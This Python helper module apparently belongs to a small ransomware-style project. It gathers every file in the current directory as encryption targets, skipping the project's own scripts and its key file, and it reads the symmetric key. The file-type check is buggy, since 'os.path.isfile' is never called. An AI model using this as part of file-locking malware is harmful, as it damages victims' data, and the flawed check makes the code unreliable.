import os 
import ctypes
# from cryptography.fernet import Fernet
# import Tkinter as tk
# import tkMessageBox
# root = tk.Tk()
# root.withdraw()

def MBox(title,text,option):
   #WINDOWS:
   # return ctypes.windll.user32.MessageBoxW(0,text,title,option)
   print(f'{title}\n{text}')
##  Options:
##  0 : OK
##  1 : OK | Cancel
##  2 : Abort | Retry | Ignore
##  3 : Yes | No | Cancel
##  4 : Yes | No
##  5 : Retry | Cancel 
##  6 : Cancel | Try Again | Continue

def addFiles():
    files = []
    for file in os.listdir():
        if file == "tools.py" or file == "savingGrace.py" or file == "darthVader.py" or file == "thekey.key" or file == "__pycache__":
                continue
        if os.path.isfile:
            files.append(file)
    return files

def getKey():
    with open("thekey.key", "rb") as thekey:
        secret = thekey.read()
    return secret